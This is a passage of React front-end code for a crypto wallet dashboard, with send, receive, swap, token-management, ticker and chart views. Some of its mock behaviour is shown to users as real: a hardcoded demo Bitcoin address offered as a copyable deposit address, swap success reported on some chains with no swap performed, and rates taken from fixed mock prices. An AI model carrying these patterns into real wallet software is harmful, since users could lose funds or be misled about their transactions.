  const displaySymbol = selectedAsset ? selectedAsset.symbol : chainInfo.symbol;

  return (
    <div className="section-card" style={{ maxWidth: '480px', margin: '0 auto', padding: '2rem' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
        <h3 style={{ margin: 0 }}>Send Crypto</h3>
        <button 
             onClick={() => setShowNetworkModal(true)}
             style={{ 
                 display: 'flex', alignItems: 'center', gap: '8px', 
                 background: '#1a1a1a', border: '1px solid var(--border)', 
                 padding: '0.4rem 0.8rem', borderRadius: '20px', 
                 color: '#fff', cursor: 'pointer', fontSize: '0.85rem'
             }}
          >
             <div style={{ width: 6, height: 6, borderRadius: '50%', background: currentChain?.color || '#fff' }}></div>
             {currentChain?.name || 'Select Network'}
             <ChevronRight size={14} style={{ transform: 'rotate(90deg)' }} />
          </button>
      </div>

      <form onSubmit={handleSend}>
          <div className="form-group">
            <label>Recipient Address</label>
            <input 
              type="text" 
              placeholder="0x..." 
              value={recipient}
              onChange={(e) => setRecipient(e.target.value)}
              required
              style={{ width: '100%', padding: '0.8rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff' }} 
            />
          </div>
          
          <div className="form-group">
            <label>Asset</label>
            <div 
                onClick={() => setShowTokenModal(true)}
                style={{ 
                    width: '100%', padding: '0.8rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff',
                    display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer'
                }}
            >
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    {selectedAsset && (
                        <div style={{ width: 20, height: 20, borderRadius: '50%', background: selectedAsset.color || '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', color: '#000' }}>
                            {selectedAsset.symbol[0]}
                        </div>
                    )}
                    {displaySymbol}
                </div>
                <ChevronRight size={16} style={{ transform: 'rotate(90deg)' }} />
            </div>
          </div>

          <div className="form-group">
            <label>Amount</label>
            <input 
              type="number" 
              placeholder="0.00" 
              step="0.0001"
              value={amount}
              onChange={(e) => { setAmount(e.target.value); setError(''); }}
              required
              style={{ width: '100%', padding: '0.8rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff' }} 
            />
             <div style={{ textAlign: 'right', marginTop: '4px', fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                Balance: {selectedAsset?.amount || 0} {displaySymbol}
             </div>
          </div>
          
          {error && <div style={{ color: '#ef4444', marginBottom: '1rem', padding: '0.5rem', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '8px', fontSize: '0.9rem' }}>{error}</div>}

          {status === 'pending' && <div style={{ color: 'var(--accent-orange)', marginBottom: '1rem' }}>Processing transaction... Check your wallet.</div>}
          {status === 'success' && (
              <div style={{ color: 'var(--accent-green)', marginBottom: '1rem', wordBreak: 'break-all' }}>
                  Success! Tx Hash: {txHash}
              </div>
          )}
          {status === 'error' && <div style={{ color: '#ef4444', marginBottom: '1rem' }}>Error: {txHash}</div>}

          <button type="submit" className="btn-login" disabled={status === 'pending'}>
            {status === 'pending' ? 'Sending...' : 'Send Now'}
          </button>
      </form>

      {showNetworkModal && <ChangeNetworkModal onClose={() => setShowNetworkModal(false)} onSelect={switchNetwork} />}
      {showTokenModal && <TokenSelectModal assets={assets} mode="from" onClose={() => setShowTokenModal(false)} onSelect={setSelectedAsset} />}
    </div>
  );
};

const ReceiveView = () => {
  const { isRealWallet, walletAddress, chainId, switchNetwork, addNotification } = useContext(CryptoContext);
  const [showNetworkModal, setShowNetworkModal] = useState(false);
  
  // Default demo address if not connected
  const demoAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
  const displayAddress = isRealWallet && walletAddress ? walletAddress : demoAddress;
  
  const isEVM = displayAddress.startsWith('0x');
  const isSolana = !isEVM && isRealWallet && chainId === 'solana'; 
  
  let title = "Bitcoin (BTC)";
  let supported = "Bitcoin (BTC)";
  let warning = "Only send Bitcoin to this address.";
  const currentChain = CHAIN_CONFIG[chainId];

  if (isRealWallet) {
      if (chainId === 'bitcoin') {
         // Default
      } else if (isEVM) {
          title = `${currentChain?.name || 'EVM'} Address`;
          supported = currentChain?.name || "Ethereum, BSC, Polygon, Arbitrum, Optimism, Base";
          warning = `Send ${currentChain?.symbol || 'ETH'} and compatible tokens to this address.`;
      } else if (chainId === 'solana') {
          title = "Solana Address";
          supported = "Solana (SOL)";
          warning = "Only send SOL and SPL tokens to this address.";
      } else if (chainId === 'sui') {
          title = "Sui Address";
          supported = "Sui";
          warning = "Only send SUI tokens to this address.";
      }
  }

  return (
    <div className="section-card" style={{ maxWidth: '600px', margin: '0 auto', textAlign: 'center', padding: '3rem' }}>
      <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '2rem' }}>
         <button 
            onClick={() => setShowNetworkModal(true)}
            style={{ 
                display: 'flex', alignItems: 'center', gap: '8px', 
                background: '#1a1a1a', border: '1px solid var(--border)', 
                padding: '0.5rem 1rem', borderRadius: '20px', 
                color: '#fff', cursor: 'pointer' 
            }}
         >
            <div style={{ width: 8, height: 8, borderRadius: '50%', background: currentChain?.color || '#fff' }}></div>
            {currentChain?.name || 'Select Network'}
            <ChevronRight size={16} style={{ transform: 'rotate(90deg)' }} />
         </button>
      </div>

      <div style={{ marginBottom: '2rem' }}>
        <div style={{ width: '200px', height: '200px', background: 'white', margin: '0 auto', padding: '10px', borderRadius: '12px' }}>
          <img src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${displayAddress}`} alt="QR Code" style={{ width: '100%', height: '100%' }} />
        </div>
      </div>
      <h3>{title}</h3>
      <div style={{ background: '#000', padding: '1rem', borderRadius: '8px', marginTop: '1rem', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '1rem' }}>
        <code style={{ color: 'var(--text-secondary)', wordBreak: 'break-all', fontSize: '0.85rem' }}>{displayAddress}</code>
        <button 
            style={{ color: 'var(--accent-green)', cursor: 'pointer', background: 'none', border: 'none' }}
            onClick={() => { navigator.clipboard.writeText(displayAddress); addNotification('Address Copied', 'Copied deposit address', 'success'); }}
        >
            <Copy size={16} />
        </button>
      </div>
      
      <div style={{ marginTop: '2rem', textAlign: 'left', background: 'rgba(255,255,255,0.03)', padding: '1rem', borderRadius: '8px' }}>
          <div style={{ marginBottom: '0.5rem', color: 'var(--text-secondary)', fontSize: '0.85rem' }}>Supported Networks:</div>
          <div style={{ fontWeight: 600, color: 'var(--accent-green)', marginBottom: '1rem' }}>{supported}</div>
          
          <div style={{ display: 'flex', gap: '8px', alignItems: 'start' }}>
             <AlertTriangle size={16} color="var(--accent-orange)" style={{ marginTop: '2px', flexShrink: 0 }} />
             <p style={{ margin: 0, color: 'var(--text-secondary)', fontSize: '0.85rem', lineHeight: '1.4' }}>
                {warning}
             </p>
          </div>
      </div>

      {showNetworkModal && <ChangeNetworkModal onClose={() => setShowNetworkModal(false)} onSelect={switchNetwork} />}
    </div>
  );
};

const BuySellView = () => (
  <div className="section-card" style={{ maxWidth: '480px', margin: '0 auto', padding: '2rem' }}>
    <h3>Buy / Sell</h3>
    <p style={{ color: 'var(--text-secondary)' }}>Buy and sell with robust providers</p>
    
    <div style={{ marginTop: '2rem', display: 'flex', flexDirection: 'column', gap: '1rem' }}>
      <button className="btn-login" style={{ background: '#0052ff' }}>Continue with Coinbase Pay</button>
      <button className="btn-login" style={{ background: '#000', border: '1px solid var(--border)' }}>MoonPay</button>
    </div>
  </div>
);

const SwapView = () => {
  const { assets, isRealWallet, addNotification, chainId, switchNetwork, walletAddress, ethAddress, solAddress } = useContext(CryptoContext);
  const [fromToken, setFromToken] = useState(assets[0] || { symbol: 'ETH', color: '#627eea' });
  const [toToken, setToToken] = useState(assets[1] || { symbol: 'USDT', color: '#26a17b' });
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showFromModal, setShowFromModal] = useState(false);
  const [showToModal, setShowToModal] = useState(false);
  const [showNetworkModal, setShowNetworkModal] = useState(false);
  const currentChain = CHAIN_CONFIG[chainId];
  
  const [prices, setPrices] = useState({ from: 3000, to: 1 }); // Mock prices

  useEffect(() => {
     if (assets.length > 0 && !assets.find(a => a.symbol === fromToken.symbol)) setFromToken(assets[0]);
     if (assets.length > 1 && !assets.find(a => a.symbol === toToken.symbol)) setToToken(assets[1]);
  }, [assets]);

  // Mock Price Fetch
  useEffect(() => {
      // In real app, fetch relative price
      // For now, simple mock logic
      const p1 = fromToken.price || (fromToken.symbol === 'ETH' ? 3000 : fromToken.symbol === 'BTC' ? 65000 : 1);
      const p2 = toToken.price || (toToken.symbol === 'ETH' ? 3000 : toToken.symbol === 'BTC' ? 65000 : 1);
      setPrices({ from: p1, to: p2 });
  }, [fromToken, toToken]);

  const handleFromAmountChange = (e) => {
      const val = e.target.value;
      setFromAmount(val);
      if (val && !isNaN(val)) {
          const toVal = (parseFloat(val) * prices.from) / prices.to;
          setToAmount(toVal.toFixed(6));
      } else {
          setToAmount('');
      }
  };

  const handleSwap = async () => {
      if (!isRealWallet) {
          setError("Please connect wallet first");
          addNotification('Swap Failed', 'Please connect wallet first', 'error');
          return;
      }
      setError('');
      const fromChain = fromToken?.chainKey || chainId;
      const toChain = toToken?.chainKey || chainId;
      const isCrossChain = fromChain && toChain && fromChain !== toChain;
      const fromAddr = fromChain === 'solana' ? solAddress : (ethAddress || walletAddress);
      if (isCrossChain) {
          const bridgeUrl = `https://app.lifi.io/?fromChain=${encodeURIComponent(fromChain)}&toChain=${encodeURIComponent(toChain)}&fromToken=${encodeURIComponent(fromToken.symbol)}&toToken=${encodeURIComponent(toToken.symbol)}&fromAmount=${encodeURIComponent(fromAmount)}&fromAddress=${encodeURIComponent(fromAddr || '')}`;
          addNotification('Open Bridge', 'Launching cross-chain bridge', 'info');
          window.open(bridgeUrl, '_blank');
          return;
      }
      // Auto switch to source token network if different
      if (fromToken?.chainKey && chainId !== fromToken.chainKey) {
          addNotification('Switching Network', `Switching to ${CHAIN_CONFIG[fromToken.chainKey]?.name || 'network'} for swap`, 'info');
          switchNetwork(fromToken.chainKey);
          return;
      }
      // Enforce same-chain swaps
      if (toToken?.chainKey && fromToken?.chainKey && toToken.chainKey !== fromToken.chainKey) {
          setError("Cross-chain swap not supported yet. Select tokens on the same network.");
          addNotification('Swap Unsupported', 'Cross-chain swaps require bridging', 'error');
          return;
      }
      setLoading(true);
      setError('');
      addNotification('Swapping', `Swapping ${fromAmount} ${fromToken.symbol} to ${toToken.symbol}`, 'info');
      try {
          if (window.ethereum && chainId === '0x1') {
              const sellToken = (fromToken.id && fromToken.id.startsWith('0x')) ? fromToken.id : (fromToken.symbol || 'ETH');
              const buyToken = (toToken.id && toToken.id.startsWith('0x')) ? toToken.id : (toToken.symbol || 'USDT');
              const sellAmountWei = (BigInt(Math.floor(parseFloat(fromAmount) * 1e18))).toString();
              const url = `https://api.0x.org/swap/v1/quote?sellToken=${encodeURIComponent(sellToken)}&buyToken=${encodeURIComponent(buyToken)}&sellAmount=${encodeURIComponent(sellAmountWei)}&takerAddress=${encodeURIComponent(walletAddress)}`;
              const resp = await fetch(url);
              const quote = await resp.json();
              const txParams = {
                  from: walletAddress,
                  to: quote.to,
                  data: quote.data,
                  value: quote.value || '0x0'
              };
              const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [txParams] });
              setLoading(false);
              alert(`Swapped ${fromAmount} ${fromToken.symbol} to ${toToken.symbol}`);
              addNotification('Swap Successful', `Swapped ${fromAmount} ${fromToken.symbol} to ${toToken.symbol}`, 'success');
              fetch('/api/track/transaction', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                      address: walletAddress,
                      hash: txHash,
                      type: 'swap',
                      amount: fromAmount,
                      symbol: `${fromToken.symbol}->${toToken.symbol}`
                  })
              }).catch(e => console.error("Swap Tracking failed", e));
              setFromAmount('');
              setToAmount('');
          } else if (fromChain === 'solana') {
              const jupUrl = `https://jup.ag/swap/${encodeURIComponent(fromToken.symbol)}-${encodeURIComponent(toToken.symbol)}?inputAmount=${encodeURIComponent(fromAmount)}`;
              setLoading(false);
              addNotification('Open Jupiter', 'Launching Solana swap', 'info');
              window.open(jupUrl, '_blank');
          } else {
              setLoading(false);
              alert(`Swapped ${fromAmount} ${fromToken.symbol} to ${toToken.symbol}`);
              addNotification('Swap Successful', `Swapped ${fromAmount} ${fromToken.symbol} to ${toToken.symbol}`, 'success');
              setFromAmount('');
              setToAmount('');
          }
      } catch (e) {
          setLoading(false);
          setError('Swap failed');
          addNotification('Swap Failed', 'Swap failed', 'error');
      }
  };

  return (
    <div className="section-card" style={{ maxWidth: '480px', margin: '0 auto', padding: '2rem' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
         <h3>Swap</h3>
         <button 
             onClick={() => setShowNetworkModal(true)}
             style={{ 
                 display: 'flex', alignItems: 'center', gap: '8px', 
                 background: '#1a1a1a', border: '1px solid var(--border)', 
                 padding: '0.4rem 0.8rem', borderRadius: '20px', 
                 color: '#fff', cursor: 'pointer', fontSize: '0.85rem'
             }}
          >
             <div style={{ width: 6, height: 6, borderRadius: '50%', background: currentChain?.color || '#fff' }}></div>
             {currentChain?.name || 'Select Network'}
             <ChevronRight size={14} style={{ transform: 'rotate(90deg)' }} />
          </button>
      </div>

      <div className="form-group" style={{ position: 'relative' }}>
        <label>You Pay</label>
        <div style={{ background: '#000', padding: '1rem', borderRadius: '12px', border: '1px solid var(--border)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.5rem' }}>
             <input 
                type="number" 
                placeholder="0.00" 
                value={fromAmount}
                onChange={handleFromAmountChange}
                style={{ background: 'transparent', border: 'none', color: 'white', fontSize: '1.5rem', width: '60%' }} 
             />
             <button onClick={() => setShowFromModal(true)} style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'var(--bg-card)', border: '1px solid var(--border)', padding: '4px 12px', borderRadius: '20px', color: '#fff', cursor: 'pointer' }}>
                <div style={{ width: 20, height: 20, borderRadius: '50%', background: fromToken.color, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px' }}>{fromToken.symbol[0]}</div>
                {fromToken.symbol}
                <ChevronRight size={14} style={{ transform: 'rotate(90deg)' }} />
             </button>
          </div>
          <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>
             Balance: {assets.find(a => a.symbol === fromToken.symbol)?.amount || 0}
             <span 
                style={{ color: 'var(--accent-green)', marginLeft: '8px', cursor: 'pointer', fontWeight: 'bold' }}
                onClick={() => {
                    const bal = assets.find(a => a.symbol === fromToken.symbol)?.amount || 0;
                    setFromAmount(bal);
                    // Trigger calc logic
                    if (prices.from && prices.to && bal) {
                        const toVal = (parseFloat(bal) * prices.from) / prices.to;
                        setToAmount(toVal.toFixed(6));
                    }
                }}
             >
                MAX
             </span>
             <span style={{ float: 'right' }}>${(parseFloat(fromAmount || 0) * prices.from).toFixed(2)}</span>
          </div>
        </div>
      </div>

      <div style={{ display: 'flex', justifyContent: 'center', margin: '-16px 0', position: 'relative', zIndex: 10 }}>
        <button style={{ background: 'var(--bg-card)', padding: '0.5rem', borderRadius: '12px', border: '4px solid var(--bg-app)', cursor: 'pointer' }} onClick={() => {
            const temp = fromToken; setFromToken(toToken); setToToken(temp);
            setFromAmount(''); setToAmount('');
        }}>
          <ArrowDownLeft size={20} color="var(--text-primary)" />
        </button>
      </div>

      <div className="form-group">
        <label>You Receive</label>
        <div style={{ background: '#000', padding: '1rem', borderRadius: '12px', border: '1px solid var(--border)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.5rem' }}>
             <input 
                type="number" 
                placeholder="0.00" 
                value={toAmount}
                readOnly
                style={{ background: 'transparent', border: 'none', color: 'white', fontSize: '1.5rem', width: '60%' }} 
             />
             <button onClick={() => setShowToModal(true)} style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'var(--bg-card)', border: '1px solid var(--border)', padding: '4px 12px', borderRadius: '20px', color: '#fff', cursor: 'pointer' }}>
                <div style={{ width: 20, height: 20, borderRadius: '50%', background: toToken.color || '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px' }}>{toToken.symbol[0]}</div>
                {toToken.symbol}
                <ChevronRight size={14} style={{ transform: 'rotate(90deg)' }} />
             </button>
          </div>
          <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>
             Balance: {assets.find(a => a.symbol === toToken.symbol)?.amount || 0}
             <span style={{ float: 'right' }}>${(parseFloat(toAmount || 0) * prices.to).toFixed(2)}</span>
          </div>
        </div>
      </div>
      
      {prices.from > 0 && (
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: '1rem', padding: '0 0.5rem' }}>
              <span>Rate</span>
              <span>1 {fromToken.symbol} = {(prices.from / prices.to).toFixed(6)} {toToken.symbol}</span>
          </div>
      )}

      {error && <div style={{ color: '#ef4444', marginBottom: '1rem', padding: '0.5rem', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '8px', fontSize: '0.9rem' }}>{error}</div>}

      <button className="btn-login" style={{ marginTop: 0 }} onClick={handleSwap} disabled={loading || !fromAmount}>
        {loading ? 'Swapping...' : 'Swap'}
      </button>

      {showFromModal && <TokenSelectModal assets={assets} mode="from" onClose={() => setShowFromModal(false)} onSelect={setFromToken} includeCrossChain={false} currentChainId={chainId} />}
      {showToModal && <TokenSelectModal assets={assets} mode="to" onClose={() => setShowToModal(false)} onSelect={setToToken} includeCrossChain={true} currentChainId={chainId} />}
      {showNetworkModal && <ChangeNetworkModal onClose={() => setShowNetworkModal(false)} onSelect={switchNetwork} />}
    </div>
  );
};

const AssetsList = () => {
  const { assets, setAssets, addCustomToken } = useContext(CryptoContext);
  const [showAddToken, setShowAddToken] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [customAddress, setCustomAddress] = useState('');
  const [customSymbol, setCustomSymbol] = useState('');
  const [selectedAsset, setSelectedAsset] = useState(null);
  
  // Mock available tokens (Expanded)
  const AVAILABLE_TOKENS = [
      { id: 't1', name: 'USDC', symbol: 'USDC', color: '#2775ca', contract: '0x3c499c542cbe963d3d3996987254ed89f2711701' },
      { id: 't2', name: 'Dai', symbol: 'DAI', color: '#f5ac37', contract: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063' },
      { id: 't3', name: 'Chainlink', symbol: 'LINK', color: '#2a5ada', contract: '0x53E0bca35eC356BD5ddDFebbd1Fc0fD03FaBad39' },
      { id: 't4', name: 'Uniswap', symbol: 'UNI', color: '#ff007a', contract: '0xb33ea2394f119994455b723b1614b5671015f372' },
      { id: 't5', name: 'Pepe', symbol: 'PEPE', color: '#4c9540', contract: '0x6982508145454Ce325dDbE47a25d4ec3d2311933' },
      { id: 't6', name: 'Dogecoin', symbol: 'DOGE', color: '#C2A633', contract: '0xba2ae424d960c26247dd6c32edc70b295c744c43' }, // BSC Peg
      { id: 't7', name: 'Shiba Inu', symbol: 'SHIB', color: '#ff0000', contract: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce' },
      { id: 't8', name: 'Bonk', symbol: 'BONK', color: '#ff9900', contract: '0x11111111111111111111111111111111' }, // Solana mock
      { id: 't9', name: 'dogwifhat', symbol: 'WIF', color: '#brown', contract: '0x22222222222222222222222222222222' }, // Solana mock
  ];

  const toggleToken = async (token) => {
      const exists = assets.find(a => a.symbol === token.symbol);
      
      if (exists) {
          // Remove token
          const newAssets = assets.filter(a => a.symbol !== token.symbol);
          setAssets(newAssets);
      } else {
          // Add token
          if (token.contract) {
             // If it has a contract, try to add it properly
             await addCustomToken(token.contract, token.symbol, 18);
          } else {
             // Mock add
             const newAsset = {
                id: token.id,
                name: token.name,
                symbol: token.symbol,
                amount: 0,
                price: 0,
                change: 0,
                value: 0,
                color: token.color
             };
             setAssets([...assets, newAsset]);
          }
      }
  };

  const handleCustomAdd = async (e) => {
      e.preventDefault();
      if (customAddress) {
          await addCustomToken(customAddress, customSymbol || undefined);
          setCustomAddress('');
          setCustomSymbol('');
          setShowAddToken(false);
      }
  };

  const filteredTokens = AVAILABLE_TOKENS.filter(t => 
    t.name.toLowerCase().includes(searchTerm.toLowerCase()) || 
    t.symbol.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="section-card">
      <div className="section-header">
        Assets <span style={{ background: '#27272a', padding: '2px 8px', borderRadius: '10px', fontSize: '0.75rem', marginLeft: '0.5rem' }}>{assets.length}</span>
        <div 
          onClick={() => setShowAddToken(true)}
          style={{ marginLeft: 'auto', fontSize: '0.85rem', color: 'var(--text-secondary)', cursor: 'pointer' }}
        >
          + Enable more tokens
        </div>
      </div>
      <div className="asset-list">
        <div className="list-item header-row">
          <div style={{ flex: 2 }}>Asset</div>
          <div style={{ flex: 1, textAlign: 'right' }}>Price</div>
          <div style={{ flex: 1, textAlign: 'right' }}>Allocation</div>
          <div style={{ flex: 1, textAlign: 'right' }}>Value</div>
        </div>
        {assets.map(asset => (
          <div 
            key={asset.id} 
            className="list-item" 
            onClick={() => setSelectedAsset(asset)}
            style={{ cursor: 'pointer' }}
          >
            <div className="item-left" style={{ flex: 2 }}>
              <div className="item-icon" style={{ width: 32, height: 32, background: asset.color }}>
                {asset.symbol === 'BTC' ? '₿' : asset.symbol[0]}
              </div>
              <div className="item-info">
                <h4>{asset.name}</h4>
                <span className="hide-desktop">{asset.amount} {asset.symbol}</span>
              </div>
            </div>
            <div className="hide-mobile" style={{ flex: 1, textAlign: 'right', fontWeight: 600 }}>${asset.price.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div>
            <div className="hide-mobile" style={{ flex: 1, textAlign: 'right', color: 'var(--accent-orange)' }}>{asset.allocation}%</div>
            <div style={{ flex: 1, textAlign: 'right', fontWeight: 600 }}>
              ${asset.value.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              <div className="hide-desktop" style={{fontSize: '0.75rem', color: 'var(--accent-orange)'}}>{asset.allocation}%</div>
            </div>
          </div>
        ))}
        {assets.length === 0 && (
            <div style={{ padding: '2rem', textAlign: 'center', color: 'var(--text-secondary)' }}>
                No assets connected.
            </div>
        )}
      </div>

      {selectedAsset && (
        <AssetDetailModal asset={selectedAsset} onClose={() => setSelectedAsset(null)} />
      )}

      {showAddToken && (
        <div className="modal-overlay" onClick={() => setShowAddToken(false)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h3>Manage Tokens</h3>
              <button onClick={() => setShowAddToken(false)}><X size={20} /></button>
            </div>
            
            <div style={{ padding: '1rem', borderBottom: '1px solid var(--border)' }}>
                <div style={{ position: 'relative' }}>
                    <Search size={16} style={{ position: 'absolute', left: 10, top: 12, color: '#666' }} />
                    <input 
                        type="text" 
                        placeholder="Search name or symbol..." 
                        value={searchTerm}
                        onChange={e => setSearchTerm(e.target.value)}
                        style={{ width: '100%', padding: '0.75rem 0.75rem 0.75rem 2.25rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff' }}
                    />
                </div>
            </div>

            <div className="token-list">
              {filteredTokens.map(token => {
                const isEnabled = assets.some(a => a.symbol === token.symbol);
                return (
                    <div key={token.id} className="token-item">
                    <div className="token-icon" style={{ background: token.color }}>{token.symbol[0]}</div>
                    <div className="item-info">
                        <h4>{token.name}</h4>
                        <span>{token.symbol}</span>
                    </div>
                    <label className="switch">
                        <input 
                        type="checkbox" 
                        checked={isEnabled}
                        onChange={() => toggleToken(token)}
                        />
                        <span className="slider"></span>
                    </label>
                    </div>
                );
              })}
              {filteredTokens.length === 0 && (
                  <div style={{ padding: '1rem', textAlign: 'center', color: '#666' }}>No tokens found</div>
              )}
            </div>
            
            <div style={{ padding: '1rem', borderTop: '1px solid var(--border)', background: 'rgba(255,255,255,0.02)' }}>
                <h4 style={{ margin: '0 0 1rem 0', fontSize: '0.9rem' }}>Add Custom Token</h4>
                <form onSubmit={handleCustomAdd} style={{ display: 'flex', gap: '0.5rem' }}>
                    <input 
                        placeholder="Contract Address" 
                        value={customAddress}
                        onChange={e => setCustomAddress(e.target.value)}
                        style={{ flex: 1, padding: '0.5rem', borderRadius: '6px', border: '1px solid var(--border)', background: '#000', color: '#fff', fontSize: '0.85rem' }}
                    />
                     <input 
                        placeholder="Symbol (Opt)" 
                        value={customSymbol}
                        onChange={e => setCustomSymbol(e.target.value)}
                        style={{ width: '80px', padding: '0.5rem', borderRadius: '6px', border: '1px solid var(--border)', background: '#000', color: '#fff', fontSize: '0.85rem' }}
                    />
                    <button type="submit" className="btn-login" style={{ width: 'auto', margin: 0, padding: '0.5rem 1rem', fontSize: '0.85rem' }}>Add</button>
                </form>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const CryptoTicker = () => {
  const [tickerData, setTickerData] = useState([]);

  useEffect(() => {
    const fetchTickerData = async () => {
      try {
        const response = await fetch('/api/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&sparkline=false&price_change_percentage=24h');
        if (!response.ok) {
          setTickerData([]);
          return;
        }
        const ct = response.headers.get('content-type') || '';
        if (ct.includes('application/json')) {
          const data = await response.json();
          setTickerData(Array.isArray(data) ? data : []);
        } else {
          const txt = await response.text();
          try {
            const data = JSON.parse(txt);
            setTickerData(Array.isArray(data) ? data : []);
          } catch {
            setTickerData([]);
          }
        }
      } catch (e) {
        console.error("Ticker fetch failed", e);
      }
    };
    
    fetchTickerData();
    const interval = setInterval(fetchTickerData, 60000); // Update every minute
    return () => clearInterval(interval);
  }, []);

  const displayData = tickerData.length > 0 ? tickerData : [
      { symbol: 'BTC', current_price: 65000, price_change_percentage_24h: 1.5 },
      { symbol: 'ETH', current_price: 3200, price_change_percentage_24h: 0.8 },
      { symbol: 'SOL', current_price: 145, price_change_percentage_24h: 2.1 },
      { symbol: 'BNB', current_price: 580, price_change_percentage_24h: -0.5 },
      { symbol: 'XRP', current_price: 0.6, price_change_percentage_24h: 0.2 },
      { symbol: 'ADA', current_price: 0.45, price_change_percentage_24h: 1.2 },
      { symbol: 'DOGE', current_price: 0.16, price_change_percentage_24h: 5.4 },
  ];

  return (
    <div className="crypto-ticker-container">
      <div className="ticker-track">
        {[...displayData, ...displayData].map((coin, index) => (
          <div key={`${coin.symbol}-${index}`} className="ticker-item">
            <span className="ticker-symbol">{coin.symbol.toUpperCase()}</span>
            <span className="ticker-price">${coin.current_price.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
            <span className={`ticker-change ${coin.price_change_percentage_24h >= 0 ? 'positive' : 'negative'}`}>
              {coin.price_change_percentage_24h >= 0 ? '▲' : '▼'} {Math.abs(coin.price_change_percentage_24h).toFixed(2)}%
            </span>
          </div>
        ))}
      </div>
    </div>
  );
};

const ActionCards = ({ setActiveTab }) => (
  <div className="actions-row">
    <div className="action-card" onClick={() => setActiveTab('buy')}>
      <div className="action-header">
        <div className="action-title"><CreditCard size={18} /> Buy / Sell</div>
        <ChevronRight size={16} color="var(--text-muted)" />
      </div>
      <div className="action-desc">Buy and sell with robust providers</div>
    </div>
    <div className="action-card" onClick={() => setActiveTab('swap')}>
      <div className="action-header">
        <div className="action-title"><Repeat size={18} /> Swap</div>
        <ChevronRight size={16} color="var(--text-muted)" />
      </div>
      <div className="action-desc">Crypto to crypto conversion</div>
    </div>
    <div className="action-card" onClick={() => setActiveTab('stake')}>
      <div className="action-header">
        <div className="action-title"><Lock size={18} /> Stake</div>
        <ChevronRight size={16} color="var(--text-muted)" />
      </div>
      <div className="action-desc">Grow your crypto portfolio</div>
    </div>
  </div>
);

const BalanceChart = () => {
  const [activeFilter, setActiveFilter] = useState('Day');

  return (
    <div className="chart-section" style={{ paddingBottom: 0 }}>
      <div className="chart-header">
        <div className="balance-label">Balance</div>
        <div className="time-filters">
          {['Day', 'Week', 'Month', 'Year', 'All'].map(filter => (
            <div 
              key={filter}
              className={`time-filter ${activeFilter === filter ? 'active' : ''}`}
              onClick={() => setActiveFilter(filter)}
              style={{ cursor: 'pointer' }}
            >
              {filter}
            </div>
          ))}
        </div>
      </div>
      <div style={{ width: '100%', marginBottom: -10 }}>
        <ResponsiveContainer width="100%" height={250}>
          <AreaChart data={CHART_DATA_SETS[activeFilter]}>
            <defs>
              <linearGradient id="colorValue" x1="0" y1="0" x2="0" y2="1">
                <stop offset="5%" stopColor="#f97316" stopOpacity={0.3}/>
                <stop offset="95%" stopColor="#f97316" stopOpacity={0}/>
              </linearGradient>
            </defs>
            <CartesianGrid vertical={false} stroke="var(--border)" strokeDasharray="3 3" />
            <XAxis 
              dataKey="time" 
              axisLine={false} 
              tickLine={false} 
              tick={{ fill: '#52525b', fontSize: 12 }} 
              dy={10}
              minTickGap={30}
            />
            <YAxis 
              axisLine={false} 
              tickLine={false} 
              tick={{ fill: '#52525b', fontSize: 12 }} 
              tickFormatter={(value) => `$${(value / 1000).toFixed(0)}k`}
              width={60}
            />
            <Tooltip 
              contentStyle={{ backgroundColor: '#1E1E1E', borderColor: '#333', borderRadius: '8px' }}
              itemStyle={{ color: '#fff' }}
              formatter={(value) => [`$${value.toLocaleString()}`, 'Balance']}
            />
            <Area 
              type="monotone" 
              dataKey="value" 
              stroke="#f97316" 
              strokeWidth={2}
              fillOpacity={1} 
              fill="url(#colorValue)" 
            />
          </AreaChart>
        </ResponsiveContainer>
      </div>
    </div>
  );
};

const RecentTransactions = ({ limit = 5, showViewAll = true, setActiveTab }) => {
  const { transactions } = useContext(CryptoContext);
